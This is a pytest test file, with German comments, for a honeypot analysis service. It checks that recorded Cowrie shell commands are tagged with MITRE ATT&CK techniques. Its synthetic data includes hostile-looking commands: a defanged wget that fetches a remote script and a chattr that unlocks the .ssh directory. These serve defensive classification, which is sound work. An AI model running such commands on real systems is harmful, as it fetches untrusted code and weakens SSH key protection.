"""ATT&CK-Tags in Ingest, /stats/recent und Worker (Schritt 6.1, Marker ``db``).

Die Ereignisse sind synthetisch und stehen hier im Test. Die Absenderadresse
stammt aus einem Dokumentationsnetz (RFC 5737), Adressen in Befehlen stehen
schon entschärft darin.
"""

from __future__ import annotations

import json
from datetime import datetime, timezone

import pytest
from sqlalchemy import select, text

from app.models import Command
from tests.conftest import make_ctx, run, send
from worker import jobs

pytestmark = pytest.mark.db

NOW = datetime(2026, 9, 18, 12, 0, tzinfo=timezone.utc)

COMMANDS = {
    "uname -a; whoami": ["T1033", "T1082"],
    "ls -la": [],
    "wget hxxp://198[.]51[.]100[.]7/x.sh": ["T1105"],
    "cd ~; chattr -ia .ssh": ["T1222.002"],
}


def session_events(session: str, commands: list[str]) -> list[dict]:
    base = {
        "session": session,
        "sensor": "hp-a",
        "src_ip": "203.0.113.5",
        "dst_ip": "198.51.100.1",
    }
    events = [{**base, "eventid": "cowrie.session.connect", "timestamp": "2026-09-17T10:00:00Z"}]
    for second, command in enumerate(commands, start=1):
        events.append(
            {
                **base,
                "eventid": "cowrie.command.input",
                "timestamp": f"2026-09-17T10:00:{second:02d}Z",
                "input": command,
            }
        )
    return events


@pytest.fixture
def ingested(client):
    events = session_events("aaaa00000001", list(COMMANDS)) + session_events("aaaa00000002", ["ls -la"])
    body = send(client, events).json()
    assert body["rejected"] == 0
    return events


def stored(engine) -> dict[str, list[str]]:
    with engine.connect() as connection:
        rows = connection.execute(select(Command.command, Command.techniques).order_by(Command.id)).all()
    return {command: techniques for command, techniques in rows}


def test_the_ingest_tags_every_command(ingested, migrated):
    assert stored(migrated) == COMMANDS


def test_recent_commands_carry_their_techniques(ingested, client):
    messages = client.get("/stats/recent").json()["messages"]
    by_command = {m["command"]: m["techniques"] for m in messages}
    assert by_command == COMMANDS


def test_the_worker_retags_and_changes_only_what_differs(ingested, migrated, database_url):
    with migrated.begin() as connection:
        connection.execute(text("UPDATE commands SET techniques = '[]'::jsonb"))
        connection.execute(
            text("UPDATE commands SET techniques = CAST(:t AS jsonb) WHERE command = 'ls -la'"),
            {"t": json.dumps(["T9999"])},
        )

    result = run(jobs.tag_commands, make_ctx(database_url, NOW))
    assert result["geprueft"] == len(COMMANDS) + 1
    # Drei getaggte Befehle waren geleert, zweimal "ls -la" trug ein falsches Tag.
    assert result["geaendert"] == 3 + 2
    assert result["attack_version"] == "19.2"
    assert stored(migrated) == COMMANDS

    again = run(jobs.tag_commands, make_ctx(database_url, NOW))
    assert again["geaendert"] == 0


def test_the_worker_walks_through_several_batches(ingested, migrated, database_url, monkeypatch):
    monkeypatch.setattr(jobs, "TAG_BATCH", 2)
    with migrated.begin() as connection:
        connection.execute(text("UPDATE commands SET techniques = '[]'::jsonb"))
    result = run(jobs.tag_commands, make_ctx(database_url, NOW))
    assert result["geprueft"] == len(COMMANDS) + 1
    assert stored(migrated) == COMMANDS


def test_the_report_lists_the_most_frequent_untagged_commands(ingested, database_url):
    report = run(jobs.untagged_report, make_ctx(database_url, NOW))
    assert report["befehle"] == len(COMMANDS) + 1
    assert report["ohne_technik"] == 2
    assert report["haeufigste"] == [("ls -la", 2)]


def test_the_report_respects_its_limit(ingested, database_url):
    report = run(jobs.untagged_report, make_ctx(database_url, NOW), limit=0)
    assert report["haeufigste"] == []
